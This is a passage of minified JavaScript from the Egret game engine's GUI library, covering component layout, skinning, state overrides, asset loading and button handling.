this._invalidateSizeFlag?(this.canSkipMeasurement()||(this.measure(),this.measuredWidth<this.minWidth&&(this.measuredWidth=this.minWidth),this.measuredWidth>this.maxWidth&&(this.measuredWidth=this.maxWidth),this.measuredHeight<this.minHeight&&(this.measuredHeight=this.minHeight),this.measuredHeight>this.maxHeight&&(this.measuredHeight=this.maxHeight)),isNaN(this._oldPreferWidth)?(this._oldPreferWidth=this.preferredWidth,this._oldPreferHeight=this.preferredHeight,t=!0):(this.preferredWidth==this._oldPreferWidth&&this.preferredHeight==this._oldPreferHeight||(t=!0),this._oldPreferWidth=this.preferredWidth,this._oldPreferHeight=this.preferredHeight),t):t},n.prototype.invalidateDisplayList=function(){this._invalidateDisplayListFlag||(this._invalidateDisplayListFlag=!0,this.parent&&e.UIGlobals._layoutManager&&e.UIGlobals._layoutManager.invalidateDisplayList(this))},n.prototype.validateDisplayList=function(){if(this._invalidateDisplayListFlag){var t=0,e=0,t=this._layoutWidthExplicitlySet?this._width:isNaN(this.explicitWidth)?this.measuredWidth:this._explicitWidth,e=this._layoutHeightExplicitlySet?this._height:isNaN(this.explicitHeight)?this.measuredHeight:this._explicitHeight;isNaN(t)&&(t=0),isNaN(e)&&(e=0),this.setActualSize(t,e),this.updateDisplayList(t,e),this._invalidateDisplayListFlag=!1}},n.prototype.validateNow=function(t){void 0===t&&(t=!1),this._validateNowFlag||null==e.UIGlobals._layoutManager?this._validateNowFlag=!0:e.UIGlobals._layoutManager.validateClient(this,t)},n.prototype.invalidateParentSizeAndDisplayList=function(){if(this.parent&&this._includeInLayout&&"invalidateSize"in this.parent){var t=this.parent;t.invalidateSize(),t.invalidateDisplayList()}},n.prototype.updateDisplayList=function(t,e){},n.prototype.canSkipMeasurement=function(){return!isNaN(this._explicitWidth)&&!isNaN(this._explicitHeight)},n.prototype.commitProperties=function(){this.oldWidth==this._width&&this.oldHeight==this._height||this.dispatchResizeEvent(),this.oldX==this.x&&this.oldY==this.y||this.dispatchMoveEvent()},n.prototype.measure=function(){this._measuredWidth=this._measuredHeight=0},n.prototype.dispatchMoveEvent=function(){this.hasEventListener(e.MoveEvent.MOVE)&&e.MoveEvent.dispatchMoveEvent(this,this.oldX,this.oldY),this.oldX=this.x,this.oldY=this.y},n.prototype._childXYChanged=function(){},n.prototype.dispatchResizeEvent=function(){this.hasEventListener(e.ResizeEvent.RESIZE)&&e.ResizeEvent.dispatchResizeEvent(this,this.oldWidth,this.oldHeight),this.oldWidth=this._width,this.oldHeight=this._height},Object.defineProperty(n.prototype,"includeInLayout",{get:function(){return this._includeInLayout},set:function(t){this._includeInLayout!=t&&(this._includeInLayout=!0,this.invalidateParentSizeAndDisplayList(),this._includeInLayout=t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"left",{get:function(){return this._left},set:function(t){this._left!=t&&(this._left=t,this.invalidateParentSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"right",{get:function(){return this._right},set:function(t){this._right!=t&&(this._right=t,this.invalidateParentSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"top",{get:function(){return this._top},set:function(t){this._top!=t&&(this._top=t,this.invalidateParentSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"bottom",{get:function(){return this._bottom},set:function(t){this._bottom!=t&&(this._bottom=t,this.invalidateParentSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"horizontalCenter",{get:function(){return this._horizontalCenter},set:function(t){this._horizontalCenter!=t&&(this._horizontalCenter=t,this.invalidateParentSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"verticalCenter",{get:function(){return this._verticalCenter},set:function(t){this._verticalCenter!=t&&(this._verticalCenter=t,this.invalidateParentSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"percentWidth",{get:function(){return this._percentWidth},set:function(t){this._percentWidth!=t&&(this._percentWidth=t,this.invalidateParentSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"percentHeight",{get:function(){return this._percentHeight},set:function(t){this._percentHeight!=t&&(this._percentHeight=t,this.invalidateParentSizeAndDisplayList())},enumerable:!0,configurable:!0}),n.prototype.setLayoutBoundsSize=function(t,e){isNaN(t)?(this._layoutWidthExplicitlySet=!1,t=this.preferredWidth):this._layoutWidthExplicitlySet=!0,isNaN(e)?(this._layoutHeightExplicitlySet=!1,e=this.preferredHeight):this._layoutHeightExplicitlySet=!0,this.setActualSize(t/this._scaleX,e/this._scaleY)},n.prototype.setLayoutBoundsPosition=function(t,e){0>this._scaleX&&(t+=this.layoutBoundsWidth),0>this._scaleY&&(e+=this.layoutBoundsHeight);var i=!1;this._x!=t&&(this._x=t,i=!0),this._y!=e&&(this._y=e,i=!0),i&&this.dispatchMoveEvent()},Object.defineProperty(n.prototype,"preferredWidth",{get:function(){var t=this._hasWidthSet?this._explicitWidth:this._measuredWidth,e=this._scaleX;return 0>e&&(e=-e),t*e},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"preferredHeight",{get:function(){var t=this._hasHeightSet?this._explicitHeight:this._measuredHeight,e=this._scaleY;return 0>e&&(e=-e),t*e},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"preferredX",{get:function(){return 0<=this._scaleX?this._x:this._x-this.preferredWidth},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"preferredY",{get:function(){return 0<=this._scaleY?this._y:this._y-this.preferredHeight},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"layoutBoundsX",{get:function(){return 0<=this._scaleX?this._x:this._x-this.layoutBoundsWidth},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"layoutBoundsY",{get:function(){return 0<=this._scaleY?this._y:this._y-this.layoutBoundsHeight},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"layoutBoundsWidth",{get:function(){var t=0,t=this._layoutWidthExplicitlySet?this._width:this._hasWidthSet?this._explicitWidth:this._measuredWidth,e=this._scaleX;return 0>e&&(e=-e),t*e},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"layoutBoundsHeight",{get:function(){var t=0,t=this._layoutHeightExplicitlySet?this._height:this._hasHeightSet?this._explicitHeight:this._measuredHeight,e=this.scaleY;return 0>e&&(e=-e),t*e},enumerable:!0,configurable:!0}),n}(t.DisplayObjectContainer);e.UIComponent=i,i.prototype.__class__="egret.gui.UIComponent"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(){}return t.ABOVE="above",t.BELOW="below",t.CENTER="center",t.TOP_LEFT="topLeft",t.LEFT="left",t.RIGHT="right",t}();t.PopUpPosition=e,e.prototype.__class__="egret.gui.PopUpPosition"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(){}return t.AUTO="auto",t.OFF="off",t.ON="on",t}();t.ScrollPolicy=e,e.prototype.__class__="egret.gui.ScrollPolicy"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(t){function e(e){void 0===e&&(e=null),t.call(this),this.generator=e}return __extends(e,t),e.prototype.newInstance=function(){return new this.generator},e}(t.HashObject);e.ClassFactory=i,i.prototype.__class__="egret.gui.ClassFactory"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(t){function e(){t.call(this)}return __extends(e,t),e.prototype.initialize=function(t){},e.prototype.apply=function(t){},e.prototype.remove=function(t){},e.prototype.initializeFromObject=function(t){for(var e in t)this[e]=t[e];return this},e}(t.HashObject);e.OverrideBase=i,i.prototype.__class__="egret.gui.OverrideBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(e){function i(t,n,r,s){e.call(this),this.propertyName="",this.position=i.LAST,this.target=t,this.propertyName=n,this.position=r,this.relativeTo=s}return __extends(i,e),i.prototype.initialize=function(e){if((e=e[this.target])&&!(e instanceof t.SkinnableComponent)&&"_initialize"in e)try{e._initialize()}catch(t){}},i.prototype.apply=function(t){var e,n;try{n=t[this.relativeTo]}catch(t){}var r=t[this.target];if(t=this.propertyName?t[this.propertyName]:t,r&&t){switch(this.position){case i.FIRST:e=0;break;case i.LAST:e=-1;break;case i.BEFORE:e=t.getElementIndex(n);break;case i.AFTER:e=t.getElementIndex(n)+1}-1==e&&(e=t.numElements),t.addElementAt(r,e)}},i.prototype.remove=function(t){var e=null==this.propertyName||""==this.propertyName?t:t[this.propertyName];(t=t[this.target])&&e&&-1!=e.getElementIndex(t)&&e.removeElement(t)},i.FIRST="first",i.LAST="last",i.BEFORE="before",i.AFTER="after",i}(t.OverrideBase);t.AddItems=e,e.prototype.__class__="egret.gui.AddItems"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(t){function e(e,i,n){t.call(this),this.target=e,this.name=i,this.value=n}return __extends(e,t),e.prototype.apply=function(t){null!=(t=null==this.target||""==this.target?t:t[this.target])&&(this.oldValue=t[this.name],this.setPropertyValue(t,this.name,this.value,this.oldValue))},e.prototype.remove=function(t){null!=(t=null==this.target||""==this.target?t:t[this.target])&&(this.setPropertyValue(t,this.name,this.oldValue,this.oldValue),this.oldValue=null)},e.prototype.setPropertyValue=function(t,e,i,n){t[e]=void 0===i||null===i?i:"boolean"==typeof n?this.toBoolean(i):i},e.prototype.toBoolean=function(t){return"string"==typeof t?"true"==t.toLowerCase():0!=t},e}(t.OverrideBase);t.SetProperty=e,e.prototype.__class__="egret.gui.SetProperty"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(t){function e(e,i){t.call(this),this.initialized=!1,this.name=e,this.overrides=i}return __extends(e,t),e.prototype.initialize=function(t){if(!this.initialized){this.initialized=!0;for(var e=0;e<this.overrides.length;e++)this.overrides[e].initialize(t)}},e}(t.HashObject);e.State=i,i.prototype.__class__="egret.gui.State"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(){}return t.adjustRelativeByXY=function(t,e){if(void 0===e&&(e=null),t&&(e||(e=t.parent),e)){var i=t.x,n=t.y,r=t.layoutBoundsHeight,s=t.layoutBoundsWidth,o=e.width,a=e.height;isNaN(t.left)||(t.left=i),isNaN(t.right)||(t.right=o-i-s),isNaN(t.horizontalCenter)||(t.horizontalCenter=i+.5*s-.5*o),isNaN(t.top)||(t.top=n),isNaN(t.bottom)||(t.bottom=a-n-r),isNaN(t.verticalCenter)||(t.verticalCenter=.5*r-.5*a+n)}},t}();t.LayoutUtil=e,e.prototype.__class__="egret.gui.LayoutUtil"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(e){var i={};(t.gui||(t.gui={})).getScale9Grid=function(e){if(i[e])return i[e];if(!e)return null;var n=e.split(","),n=new t.Rectangle(parseInt(n[0]),parseInt(n[1]),parseInt(n[2]),parseInt(n[3]));return i[e]=n}}()}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(t,e){void 0===e&&(e=!0),i.call(this),this.fillMode="scale",this.contentReused=this.createChildrenCalled=this.sourceChanged=!1,this.autoScale=!0,this.touchChildren=!1,t&&(this.source=t),this.autoScale=e}return __extends(n,i),Object.defineProperty(n.prototype,"source",{get:function(){return this._source},set:function(t){this._source!=t&&(this._source=t,this.createChildrenCalled?this.parseSource():this.sourceChanged=!0)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"content",{get:function(){return this._content},enumerable:!0,configurable:!0}),n.prototype.createChildren=function(){i.prototype.createChildren.call(this),this.sourceChanged&&this.parseSource(),this.createChildrenCalled=!0},n.prototype.parseSource=function(){this.sourceChanged=!1;var t=n.assetAdapter;if(t||(t=this.getAdapter()),this._source){var e=this.contentReused?null:this._content;this.contentReused=!0,t.getAsset(this._source,this.contentChanged,this,e)}else this.contentChanged(null,null)},n.prototype.getAdapter=function(){var i;try{i=t.Injector.getInstance("egret.gui.IAssetAdapter")}catch(t){i=new e.DefaultAssetAdapter}return n.assetAdapter=i},n.prototype.contentChanged=function(i,n){if(n===this._source){var r=this._content;this._content=i,r!==i&&(r instanceof t.DisplayObject&&this._removeFromDisplayList(r),i instanceof t.DisplayObject&&this._addToDisplayListAt(i,0)),this.invalidateSize(),this.invalidateDisplayList(),this.contentReused=!1,this.hasEventListener(e.UIEvent.CONTENT_CHANGED)&&e.UIEvent.dispatchUIEvent(this,e.UIEvent.CONTENT_CHANGED)}},n.prototype.measure=function(){i.prototype.measure.call(this);var e=this._content;e instanceof t.DisplayObject?"preferredWidth"in e?(this.measuredWidth=e.preferredWidth,this.measuredHeight=e.preferredHeight):(this.measuredWidth=e.width*e.scaleX,this.measuredHeight=e.height*e.scaleY):e instanceof t.Texture&&(this.measuredWidth=e._textureWidth,this.measuredHeight=e._textureHeight)},n.prototype.updateDisplayList=function(e,n){i.prototype.updateDisplayList.call(this,e,n);var r=this._content;this.autoScale&&r instanceof t.DisplayObject&&("setLayoutBoundsSize"in r?r.setLayoutBoundsSize(e,n):(r.width=e/r.scaleX,r.height=n/r.scaleY)),this._setSizeDirty()},n.prototype._render=function(e){if(this._content instanceof t.Texture){var n=this._content;this._texture_to_render=n;var r;this.autoScale?(r=this._width,n=this._height):(r=n.textureWidth,n=n.textureHeight),t.Bitmap._drawBitmap(e,r,n,this)}else this._texture_to_render=null;i.prototype._render.call(this,e)},n.prototype._measureBounds=function(){var e=i.prototype._measureBounds.call(this);if(this._content instanceof t.Texture){var n=this._content,r=this.width,s=this.height,o=Math.floor(n._offsetX*r/n._textureWidth),n=Math.floor(n._offsetY*s/n._textureHeight);o<e.x&&(e.x=o),n<e.y&&(e.y=n),o+r>e.right&&(e.right=o+r),n+s>e.bottom&&(e.bottom=n+s)}return e},n.prototype.addChild=function(t){throw Error("addChild()"+n.errorStr+"addElement()代替")},n.prototype.addChildAt=function(t,e){throw Error("addChildAt()"+n.errorStr+"addElementAt()代替")},n.prototype.removeChild=function(t){throw Error("removeChild()"+n.errorStr+"removeElement()代替")},n.prototype.removeChildAt=function(t){throw Error("removeChildAt()"+n.errorStr+"removeElementAt()代替")},n.prototype.setChildIndex=function(t,e){throw Error("setChildIndex()"+n.errorStr+"setElementIndex()代替")},n.prototype.swapChildren=function(t,e){throw Error("swapChildren()"+n.errorStr+"swapElements()代替")},n.prototype.swapChildrenAt=function(t,e){throw Error("swapChildrenAt()"+n.errorStr+"swapElementsAt()代替")},n.errorStr="在此组件中不可用，若此组件为容器类，请使用",n}(e.UIComponent);e.UIAsset=i,i.prototype.__class__="egret.gui.UIAsset"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this.hostComponentKey="egret.gui.SkinnableComponent",this.stateIsDirty=this.createChildrenCalled=this._skinNameExplicitlySet=!1,this.explicitMouseEnabled=this.explicitMouseChildren=this._autoMouseEnabled=!0}return __extends(n,i),Object.defineProperty(n.prototype,"skinName",{get:function(){return this._skinName},set:function(t){this._skinName!=t&&(this._skinName=t,this._skinNameExplicitlySet=!0,this.createChildrenCalled&&this.parseSkinName())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"skin",{get:function(){return this._skin},enumerable:!0,configurable:!0}),n.prototype.createChildren=function(){i.prototype.createChildren.call(this),this.parseSkinName(),this.createChildrenCalled=!0},n.prototype.parseSkinName=function(){(i=n.skinAdapter)||(i=this.getSkinAdapter());var i=i.getSkin(this._skinName,this.hostComponentKey),r=this._skin;this.detachSkin(r),r instanceof t.DisplayObject&&this._removeFromDisplayList(r),this._skin=i,i instanceof t.DisplayObject&&this._addToDisplayListAt(this._skin,0),this.attachSkin(i),this.invalidateSkinState(),this.invalidateSize(),this.invalidateDisplayList(),this.hasEventListener(e.UIEvent.SKIN_CHANGED)&&e.UIEvent.dispatchUIEvent(this,e.UIEvent.SKIN_CHANGED)},n.prototype.getSkinAdapter=function(){var i;try{i=t.Injector.getInstance("egret.gui.ISkinAdapter")}catch(t){i=new e.DefaultSkinAdapter}return n.skinAdapter=i},n.prototype.attachSkin=function(e){e&&"hostComponent"in e&&(e.hostComponent=this,this.findSkinParts()),e&&"hostComponent"in e&&e instanceof t.DisplayObject?this._setSkinLayoutEnabled(!1):this._setSkinLayoutEnabled(!0)},n.prototype.findSkinParts=function(){var t=this._skin;if(t&&"skinParts"in t)for(var e=t.skinParts,i=e.length,n=0;n<i;n++){var r=e[n];if(r in t)try{this[r]=t[r],this.partAdded(r,t[r])}catch(t){}}},n.prototype.detachSkin=function(t){if(t&&"skinParts"in t){for(var e=t.skinParts,i=e.length,n=0;n<i;n++){var r=e[n];r in this&&(null!=this[r]&&this.partRemoved(r,this[r]),this[r]=null)}t.hostComponent=null}},n.prototype.partAdded=function(t,i){e.SkinPartEvent.dispatchSkinPartEvent(this,e.SkinPartEvent.PART_ADDED,t,i)},n.prototype.partRemoved=function(t,i){e.SkinPartEvent.dispatchSkinPartEvent(this,e.SkinPartEvent.PART_REMOVED,t,i)},n.prototype.invalidateSkinState=function(){this.stateIsDirty||(this.stateIsDirty=!0,this.invalidateProperties())},n.prototype.validateSkinState=function(){var t=this.getCurrentSkinState(),e=this._skin;e&&"currentState"in e&&(e.currentState=t),this.hasEventListener("stateChanged")&&this.dispatchEventWith("stateChanged")},Object.defineProperty(n.prototype,"autoTouchEnabled",{get:function(){return this._autoMouseEnabled},set:function(t){this._autoMouseEnabled!=t&&((this._autoMouseEnabled=t)?(this._touchChildren=!!this.enabled&&this.explicitMouseChildren,this._touchEnabled=!!this.enabled&&this.explicitMouseEnabled):(this._touchChildren=this.explicitMouseChildren,this._touchEnabled=this.explicitMouseEnabled))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"touchChildren",{get:function(){return this._touchChildren},set:function(t){this.enabled&&(this._touchChildren=t),this.explicitMouseChildren=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"touchEnabled",{get:function(){return this._touchEnabled},set:function(t){this.enabled&&(this._touchEnabled=t),this.explicitMouseEnabled=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"enabled",{get:function(){return this._enabled},set:function(t){this._setEnabled(t)},enumerable:!0,configurable:!0}),n.prototype._setEnabled=function(t){this._enabled!=t&&(this._enabled=t,this._autoMouseEnabled&&(this._touchChildren=!!t&&this.explicitMouseChildren,this._touchEnabled=!!t&&this.explicitMouseEnabled),this.invalidateSkinState())},n.prototype.getCurrentSkinState=function(){return this.enabled?"normal":"disabled"},n.prototype.commitProperties=function(){i.prototype.commitProperties.call(this),this.stateIsDirty&&(this.stateIsDirty=!1,this.validateSkinState())},n.prototype._setSkinLayoutEnabled=function(t){null!=this.skinLayout!=t&&(t?(this.skinLayout=new e.SkinBasicLayout,this.skinLayout.target=this):this.skinLayout=this.skinLayout.target=null,this.invalidateSize(),this.invalidateDisplayList())},n.prototype._childXYChanged=function(){this.skinLayout&&(this.invalidateSize(),this.invalidateDisplayList())},n.prototype.measure=function(){i.prototype.measure.call(this);var e=this._skin;if(e){if((n=e instanceof t.DisplayObject)&&(e&&"preferredWidth"in e?(this.measuredWidth=e.preferredWidth,this.measuredHeight=e.preferredHeight):(this.measuredWidth=e.width,this.measuredHeight=e.height)),this.skinLayout&&this.skinLayout.measure(),!n){var n=this.measuredWidth,r=this.measuredHeight;try{isNaN(e.width)||(n=Math.ceil(e.width)),isNaN(e.height)||(r=Math.ceil(e.height)),e.hasOwnProperty("minWidth")&&n<e.minWidth&&(n=e.minWidth),e.hasOwnProperty("maxWidth")&&n>e.maxWidth&&(n=e.maxWidth),e.hasOwnProperty("minHeight")&&r<e.minHeight&&(r=e.minHeight),e.hasOwnProperty("maxHeight")&&r>e.maxHeight&&(r=e.maxHeight),this.measuredWidth=n,this.measuredHeight=r}catch(t){}}}},n.prototype.updateDisplayList=function(e,n){i.prototype.updateDisplayList.call(this,e,n);var r=this._skin;r&&("setLayoutBoundsSize"in r?r.setLayoutBoundsSize(e,n):r instanceof t.DisplayObject&&(r.scaleX=0==r.width?1:e/r.width,r.scaleY=0==r.height?1:n/r.height)),this.skinLayout&&this.skinLayout.updateDisplayList(e,n)},n.prototype.addChild=function(t){throw Error("addChild()"+n.errorStr+"addElement()代替")},n.prototype.addChildAt=function(t,e){throw Error("addChildAt()"+n.errorStr+"addElementAt()代替")},n.prototype.removeChild=function(t){throw Error("removeChild()"+n.errorStr+"removeElement()代替")},n.prototype.removeChildAt=function(t){throw Error("removeChildAt()"+n.errorStr+"removeElementAt()代替")},n.prototype.setChildIndex=function(t,e){throw Error("setChildIndex()"+n.errorStr+"setElementIndex()代替")},n.prototype.swapChildren=function(t,e){throw Error("swapChildren()"+n.errorStr+"swapElements()代替")},n.prototype.swapChildrenAt=function(t,e){throw Error("swapChildrenAt()"+n.errorStr+"swapElementsAt()代替")},n.errorStr="在此组件中不可用，若此组件为容器类，请使用",n}(e.UIComponent);e.SkinnableComponent=i,i.prototype.__class__="egret.gui.SkinnableComponent"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(e){var i=function(){function e(){}return e.prototype.getSkin=function(e,i){if(!e)return null;if(e.prototype)return new e;if("string"==typeof e){var n=t.getDefinitionByName(e);return n?new n:null}return e},e}();e.DefaultSkinAdapter=i,i.prototype.__class__="egret.gui.DefaultSkinAdapter"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(e){var i=function(){function e(){}return e.prototype.getAsset=function(e,i,n,r){var s=e;if(e.prototype&&(s=new e),s instanceof t.DisplayObject||s instanceof t.Texture)i.call(n,s,e);else if("string"==typeof e){var o=new t.URLLoader;o.dataFormat=t.URLLoaderDataFormat.TEXTURE,o.addEventListener(t.Event.COMPLETE,function(t){s=o.data,i.call(n,s,e)},this),o.load(new t.URLRequest(e))}else i.call(n,s,e)},e}();e.DefaultAssetAdapter=i,i.prototype.__class__="egret.gui.DefaultAssetAdapter"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(t){function e(){t.call(this)}return __extends(e,t),Object.defineProperty(e.prototype,"target",{get:function(){return this._target},set:function(t){this._target=t},enumerable:!0,configurable:!0}),e.prototype.measure=function(){if(null!=this.target){for(var t=0,e=0,i=this._target.skin,n=this.target.numChildren,r=0;r<n;r++){var s=this.target.getChildAt(r);if(s&&s!=i&&s.includeInLayout){var o=s.horizontalCenter,a=s.verticalCenter,h=s.left,l=s.right,p=s.top,u=s.bottom;isNaN(h)||isNaN(l)?isNaN(o)?isNaN(h)&&isNaN(l)?o=s.preferredX:(o=isNaN(h)?0:h,o+=isNaN(l)?0:l):o=2*Math.abs(o):o=h+l,isNaN(p)||isNaN(u)?isNaN(a)?isNaN(p)&&isNaN(u)?a=s.preferredY:(a=isNaN(p)?0:p,a+=isNaN(u)?0:u):a=2*Math.abs(a):a=p+u,u=s.preferredHeight,t=Math.ceil(Math.max(t,o+s.preferredWidth)),e=Math.ceil(Math.max(e,a+u))}}this.target.measuredWidth=Math.max(t,this.target.measuredWidth),this.target.measuredHeight=Math.max(e,this.target.measuredHeight)}},e.prototype.updateDisplayList=function(t,e){if(null!=this.target)for(var i=this.target.numChildren,n=this._target.skin,r=0;r<i;r++){var s=this.target.getChildAt(r);if(null!=s&&s!=n&&s.includeInLayout){var o=s.horizontalCenter,a=s.verticalCenter,h=s.left,l=s.right,p=s.top,u=s.bottom,d=s.percentWidth,c=s.percentHeight,_=NaN,g=NaN;isNaN(h)||isNaN(l)?isNaN(d)||(_=Math.round(t*Math.min(.01*d,1))):_=t-l-h,isNaN(p)||isNaN(u)?isNaN(c)||(g=Math.round(e*Math.min(.01*c,1))):g=e-u-p,s.setLayoutBoundsSize(_,g),d=s.layoutBoundsWidth,c=s.layoutBoundsHeight,g=_=NaN,_=isNaN(o)?isNaN(h)?isNaN(l)?s.layoutBoundsX:t-d-l:h:Math.round((t-d)/2+o),g=isNaN(a)?isNaN(p)?isNaN(u)?s.layoutBoundsY:e-c-u:p:Math.round((e-c)/2+a),s.setLayoutBoundsPosition(_,g)}}},e}(t.HashObject);e.SkinBasicLayout=i,i.prototype.__class__="egret.gui.SkinBasicLayout"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._autoRepeat=this._downEventFired=!1,this._repeatInterval=this._repeatDelay=35,this._keepDown=this._hovered=!1,this._label="",this.touchChildren=this._stickyHighlighting=this._mouseCaptured=!1,this.addHandlers()}return __extends(n,i),Object.defineProperty(n.prototype,"autoRepeat",{get:function(){return this._autoRepeat},set:function(t){t!=this._autoRepeat&&(this._autoRepeat=t,this.checkAutoRepeatTimerConditions(this.isDown()))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"repeatDelay",{get:function(){return this._repeatDelay},set:function(t){this._repeatDelay=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"repeatInterval",{get:function(){return this._repeatInterval},set:function(t){this._repeatInterval=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"hovered",{get:function(){return this._hovered},set:function(t){t!=this._hovered&&(this._hovered=t,this.invalidateSkinState(),this.checkButtonDownConditions())},enumerable:!0,configurable:!0}),n.prototype._setKeepDown=function(t){this._keepDown!=t&&(this._keepDown=t,this.invalidateSkinState())},Object.defineProperty(n.prototype,"label",{get:function(){return this._getLabel()},set:function(t){this._setLabel(t)},enumerable:!0,configurable:!0}),n.prototype._getLabel=function(){return this.labelDisplay?this.labelDisplay.text:this._label},n.prototype._setLabel=function(t){this._label=t,this.labelDisplay&&(this.labelDisplay.text=t)},Object.defineProperty(n.prototype,"mouseCaptured",{get:function(){return this._mouseCaptured},set:function(t){t!=this._mouseCaptured&&(this._mouseCaptured=t,this.invalidateSkinState(),t||this.removeStageMouseHandlers(),this.checkButtonDownConditions())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"stickyHighlighting",{get:function(){return this._stickyHighlighting},set:function(t){t!=this._stickyHighlighting&&(this._stickyHighlighting=t,this.invalidateSkinState(),this.checkButtonDownConditions())},enumerable:!0,configurable:!0}),n.prototype.checkButtonDownConditions=function(){var t=this.isDown();this._downEventFired!=t&&(t&&e.UIEvent.dispatchUIEvent(this,e.UIEvent.BUTTON_DOWN),this._downEventFired=t,this.checkAutoRepeatTimerConditions(t))},n.prototype.addHandlers=function(){this.addEventListener(t.TouchEvent.TOUCH_ROLL_OVER,this.mouseEventHandler,this),this.addEventListener(t.TouchEvent.TOUCH_ROLL_OUT,this.mouseEventHandler,this),this.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.mouseEventHandler,this),this.addEventListener(t.TouchEvent.TOUCH_END,this.mouseEventHandler,this),this.addEventListener(t.TouchEvent.TOUCH_TAP,this.mouseEventHandler,this)},n.prototype.addStageMouseHandlers=function(){e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler,this),e.UIGlobals.stage.addEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpHandler,this)},n.prototype.removeStageMouseHandlers=function(){e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler,this),e.UIGlobals.stage.removeEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpHandler,this)},n.prototype.isDown=function(){return!!this.enabled&&!(!this.mouseCaptured||!this.hovered&&!this.stickyHighlighting)},n.prototype.checkAutoRepeatTimerConditions=function(t){(t=this.autoRepeat&&t)!=(null!=this.autoRepeatTimer)&&(t?this.startTimer():this.stopTimer())},n.prototype.startTimer=function(){this.autoRepeatTimer=new t.Timer(1),this.autoRepeatTimer.delay=this._repeatDelay,this.autoRepeatTimer.addEventListener(t.TimerEvent.TIMER,this.autoRepeat_timerDelayHandler,this),this.autoRepeatTimer.start()},n.prototype.stopTimer=function(){this.autoRepeatTimer.stop(),this.autoRepeatTimer=null},n.prototype.mouseEventHandler=function(e){switch(e.type){case t.TouchEvent.TOUCH_ROLL_OVER:if(e.touchDown&&!this.mouseCaptured)break;this.hovered=!0;break;case t.TouchEvent.TOUCH_ROLL_OUT:this.hovered=!1;break;case t.TouchEvent.TOUCH_BEGIN:this.addStageMouseHandlers(),t.InteractionMode.mode==t.InteractionMode.TOUCH&&(this.hovered=!0),this.mouseCaptured=!0;break;case 